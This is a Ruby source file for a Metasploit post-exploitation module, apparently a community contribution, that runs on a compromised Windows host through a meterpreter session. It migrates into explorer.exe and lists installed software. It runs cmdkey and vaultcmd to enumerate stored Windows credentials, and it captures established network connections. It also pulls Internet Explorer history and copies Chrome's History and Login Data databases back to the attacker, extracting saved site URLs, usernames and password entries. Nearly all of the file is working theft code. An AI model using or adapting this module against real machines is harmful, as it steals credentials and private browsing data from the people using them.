##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'sqlite3'

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::Registry

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Host Information Collection',
      'Description'   => %q(
        This module collects Installed Applications, Host Credentials, Network Connection (ESTABLISHED), 
      Internet Explorer History, Google Chrome History and saved passwords.
      ),
      'License'       => MSF_LICENSE,
      'Author'        => 'AnonySec',
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ]
      ))

    register_options(
      [
        OptBool.new('MIGRATE', [false, 'Automatically migrate to explorer.exe', false])
      ])
  end

  # /post/windows/gather/enum_chrome
  # migrate to explorer.exe
  def migrate(pid=nil)
    current_pid = session.sys.process.open.pid
    target_pid = session.sys.process["explorer.exe"]
    if target_pid != current_pid
      print_status("Current PID #{current_pid}, migrating into explorer.exe, PID #{target_pid}.")
      begin
        session.core.migrate(target_pid)
      rescue ::Exception => e
        print_error(e)
        return false
      end
    end
    return true
  end

  # post/windows/gather/enum_applications
  def app_list
    print_status("Enumerating applications installed on #{sysinfo['Computer']}")
    tbl = Rex::Text::Table.new(
      'Header'  => "Installed Applications",
      'Indent'  => 1,
      'Columns' =>
      [
        "Name",
        "Version"
      ])
    appkeys = [
      'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall',
      'HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall',
      'HKLM\\SOFTWARE\\WOW6432NODE\\Microsoft\\Windows\\CurrentVersion\\Uninstall',
      'HKCU\\SOFTWARE\\WOW6432NODE\\Microsoft\\Windows\\CurrentVersion\\Uninstall',
      ]
    apps = []
    appkeys.each do |keyx86|
      found_keys = registry_enumkeys(keyx86)
      if found_keys
        found_keys.each do |ak|
          apps << keyx86 +"\\" + ak
        end
      end
    end

    t = []
    while(not apps.empty?)

      1.upto(16) do
        t << framework.threads.spawn("Module(#{self.refname})", false, apps.shift) do |k|
          begin
            dispnm = registry_getvaldata("#{k}","DisplayName")
            dispversion = registry_getvaldata("#{k}","DisplayVersion")
            tbl << [dispnm,dispversion] if dispnm and dispversion
          rescue
          end
        end

      end
      t.map{|x| x.join }
    end

    results = tbl.to_s

    print_line("\n" + results + "\n")

    p = store_loot("host.applications", "text/plain", session, results, "applications.txt", "Installed Applications")
    print_good("Results stored in: #{p}")
  end

  def credential
    print_line ("\nHost Credentials\n================")
    # 中文乱码，英文输出 chcp 437
    # session.sys.process.execute("cmd.exe /c cmdkey /list > C:\\Windows\\Temp\\cmdkey.txt") 
    # 列出Windows凭据: cmdkey /list , 列出保管库(vault)列表: vaultcmd /list
    cred = cmd_exec("cmd.exe /c chcp 437 && cmdkey /list && vaultcmd /list")
    print_line ("#{cred}")
  end

  def netstat
    print_line ("\nNetstat\n=======")
    net = cmd_exec("cmd.exe /c netstat -ano|findstr ESTABLISHED")
    print_line ("#{net}")
  end

  # IE输入网址 注册表HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\TypedURLs
  def ie_history
    # # IE版本获取
    # ver = registry_getvaldata("HKLM\\SOFTWARE\\Microsoft\\Internet Explorer", "Version")
    # print_line("\nIE Version: #{ver}")
    # print_line ("<-------------------------IE History------------------------->")
    print_line ("\nIE History\n==========")
    # 返回给定注册表项的值名称数组
    keys = registry_enumvals("HKCU\\Software\\Microsoft\\Internet Explorer\\TypedURLs")
    # print_good("#{keys}")
    if (not keys.empty?)
      while(not keys.empty?)
        key = keys.shift
        # 返回给定注册表项和值的数据
        valname = registry_getvaldata("HKCU\\Software\\Microsoft\\Internet Explorer\\TypedURLs","#{key}")
        print_line ("#{valname}")
      end
    else
      print_error("NO History Data.")
    end
  end

  def chrome_history
    # 检查目标注册表上是否存在键
    key = registry_key_exist?("HKCU\\Software\\Google")
    # print_good("#{key}")
    if key
      # ver = registry_getvaldata("HKCU\\Software\\Google\\Chrome\\BLBeacon", "version")
      # print_line("\nChrome Version: #{ver}")
      # 实际目录 /.msf4/loot/
      dir = Msf::Config.loot_directory
      # 下载目标机谷歌History.sqlite
      session.fs.file.download_file("#{dir}/#{rhost}-Chrome_history.sqlite","%LocalAppData%\\Google\\Chrome\\User Data\\Default\\History")
      print_status("Chrome History file saved to: #{dir}/#{rhost}-Chrome_history.sqlite")
      # print_line ("<-----------------------Chrome History----------------------->")
      print_line ("\nChrome History\n==============")
      begin
        file = "#{dir}/#{rhost}-Chrome_history.sqlite"
        # SQLite3 database engine 
        maildb = SQLite3::Database.new(file)
        # url = maildb.execute("select url,title from urls;")
        urls = maildb.execute("select url from urls;")
        if (not urls.empty?)
          while(not urls.empty?)
            url = (urls.shift).shift
            print_line ("#{url}")
          end
          maildb.close
          chrome_login
        else
          print_error("NO History Data.")
        end
      end
      else
        print_line ("")
        print_error("NO Google Chrome.")
      end
  end

  # 参考post/windows/gather/enum_chrome
  def chrome_login
    dir = Msf::Config.loot_directory
    session.fs.file.download_file("#{dir}/#{rhost}-Chrome_login.sqlite","%LocalAppData%\\Google\\Chrome\\User Data\\Default\\Login Data")
    # print_status("Chrome Login file saved to: #{dir}/#{rhost}-Chrome_login.sqlite")
    # print_line ("Chrome Login\n============")
    begin
      file = "#{dir}/#{rhost}-Chrome_login.sqlite"
      maildb = SQLite3::Database.new(file)
      # login = maildb.execute("SELECT action_url, username_value, password_value FROM logins;")
      urls = maildb.execute("SELECT action_url FROM logins;")
      username = maildb.execute("SELECT username_value FROM logins;")
      password = maildb.execute("SELECT password_value FROM logins;")
      tbl = Rex::Text::Table.new(
        'Header' => 'Chrome Login',
        'Indent'  => 1, # 缩进
        'Columns' => ['Url','Username']
      )
      if (not urls.empty?)
        line = 0
        while(not urls.empty?)
          url = (urls.shift).shift
          user = (username.shift).shift
          pass = password.shift
          line += pass.length
          # print_good ("#{url}")
          # print_good ("#{user}")
          tbl << [
            url,
            user
          ]
        end
      print_line ("\n#{tbl.to_s}")
      print_good ("Found #{line} Chrome saved passwords.")
      else
        print_line ("")
        print_error("NO chrome Login Data.")
      end
      maildb.close
    end
  end

  def run
    ver = sysinfo["OS"]
    print_status("Target OS: #{ver}")
    current = session.sys.process.open.pid
    target = (session.sys.process["powershell.exe"] or session.sys.process["rundll32.exe"])
    # print_status("Current: #{current} Target: #{target}")
    if current == target
      if datastore['MIGRATE']
        migrate
        app_list
        credential
        netstat
        ie_history
        chrome_history
      else
        print_error("Module run will error, Try setting MIGRATE.")
        return
      end
    else
      if datastore['MIGRATE']
        migrate
      end
      app_list
      credential
      netstat
      ie_history
      chrome_history
    end
  end
end